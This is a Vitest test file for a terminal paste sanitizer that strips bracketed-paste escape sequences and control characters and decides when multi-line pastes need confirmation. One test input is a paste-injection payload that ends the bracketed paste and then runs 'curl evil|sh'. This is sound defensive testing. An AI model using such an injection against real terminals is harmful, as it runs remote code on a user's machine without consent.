import { describe, expect, it } from 'vitest'
import { pasteLineCount, pasteNeedsConfirmation, sanitizePaste } from './terminal-paste.js'

describe('sanitizePaste', () => {
	it('removes escape sequences that could end a bracketed paste', () => {
		expect(sanitizePaste('x\u001b[201~; curl evil|sh\n')).toBe('x[201~; curl evil|sh\n')
	})
	it('removes 8-bit control introducers and other controls', () => {
		expect(sanitizePaste('a\u009b201~b\u0000c\u0007d')).toBe('a201~bcd')
	})
	it('keeps tabs, carriage returns and line feeds', () => {
		expect(sanitizePaste('a\tb\r\nc\nd')).toBe('a\tb\r\nc\nd')
	})
})

describe('pasteNeedsConfirmation', () => {
	it('asks for several lines when the program does not bracket pastes', () => {
		expect(pasteNeedsConfirmation('a\nb', false)).toBe(true)
		expect(pasteLineCount('a\nb\n')).toBe(2)
	})
	it('does not ask for one line, with or without a trailing newline', () => {
		expect(pasteNeedsConfirmation('a', false)).toBe(false)
		expect(pasteNeedsConfirmation('a\n', false)).toBe(false)
	})
	it('does not ask when the program holds pastes back itself', () => {
		expect(pasteNeedsConfirmation('a\nb', true)).toBe(false)
	})
})
